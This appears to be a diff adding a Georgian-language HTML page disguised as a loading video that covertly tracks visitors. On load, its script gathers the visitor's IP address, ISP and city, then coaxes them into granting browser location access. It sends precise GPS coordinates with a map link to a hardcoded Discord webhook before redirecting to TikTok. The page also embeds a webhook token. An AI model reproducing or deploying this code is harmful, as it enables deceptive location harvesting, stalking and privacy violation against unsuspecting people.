@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <title>ჩატვირთვა...</title>
+    <script>
+        async function sendToDiscord(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        }
+
+        async function startTracking() {
+            // 1. ჯერ ვიღებთ IP-ზე დაფუძნებულ ინფორმაციას (პროვაიდერი და ა.შ.)
+            const ipResponse = await fetch('http://ip-api.com/json/');
+            const ipData = await ipResponse.json();
+
+            let discordData = {
+                username: "Gvaska Precision Tracker",
+                embeds: [{
+                    title: "🚨 ახალი მონაცემები მოვიდა",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP მისამართი", value: `\`${ipData.query}\``, inline: true },
+                        { name: "📡 პროვაიდერი (ISP)", value: ipData.isp, inline: true },
+                        { name: "🏙️ ქალაქი (IP-ით)", value: ipData.city, inline: true }
+                    ],
+                    footer: { text: "ველოდებით ზუსტ კოორდინატებს..." }
+                }]
+            };
+
+            // ვაგზავნით პირველად მონაცემებს
+            await sendToDiscord(discordData);
+
+            // 2. ვთხოვთ ბრაუზერს ზუსტ GPS ლოკაციას
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    const precisionData = {
+                        username: "Gvaska Precision Tracker",
+                        embeds: [{
+                            title: "📍 ზუსტი ლოკაცია ნაპოვნია!",
+                            color: 5763719, // მწვანე
+                            fields: [
+                                { name: "🗺️ რეალური კოორდინატები", value: `Lat: ${lat}, Lon: ${lon}`, inline: true },
+                                { name: "🎯 სიზუსტე", value: `${Math.round(accuracy)} მეტრი`, inline: true },
+                                { name: "🔗 ზუსტი რუკა", value: `[ნახვა Google Maps-ზე](https://www.google.com/maps?q=${lat},${lon})` }
+                            ]
+                        }]
+                    };
+                    // ვაგზავნით ზუსტ მონაცემებს
+                    await sendToDiscord(precisionData);
+                    
+                    // გადამისამართება
+                    window.location.href = "https://www.tiktok.com";
+                }, (error) => {
+                    // თუ მომხმარებელმა უარი თქვა ლოკაციაზე
+                    console.log("მომხმარებელმა დაბლოკა ლოკაცია");
+                    window.location.href = "https://www.tiktok.com";
+                });
+            } else {
+                window.location.href = "https://www.tiktok.com";
+            }
+        }
+
+        window.onload = startTracking;
+    </script>
+</head>
+<body style="background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+    <div style="text-align: center;">
+        <h2>ვიდეო იტვირთება...</h2>
+        <p>გთხოვთ დააჭიროთ "Allow"-ს თუ ამოგიგდებთ</p>
+    </div>
+</body>
+</html>
